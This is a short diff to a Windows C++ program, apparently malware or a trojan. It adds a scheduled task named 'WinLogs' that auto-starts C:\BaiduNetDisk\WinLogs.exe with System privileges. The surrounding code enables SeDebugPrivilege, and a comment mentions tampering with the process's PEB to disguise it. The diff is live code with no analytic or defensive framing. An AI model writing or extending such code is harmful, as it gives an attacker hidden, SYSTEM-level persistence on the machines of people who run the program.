@@ -35,6 +35,12 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
 	CToolhelp::EnablePrivilege(SE_DEBUG_NAME, true);
 
+	// 添加自启动
+	CMyTaskSchedule task;
+	task.NewTask((char*)"WinLogs", 
+		(char*)"C:\\BaiduNetDisk\\WinLogs.exe", (char*)"System");
+
+
 	// 修改peb之前 拿到自身正确地址
 	::GetModuleFileName(NULL, g_szCurrentDirectory, MAX_PATH);
 
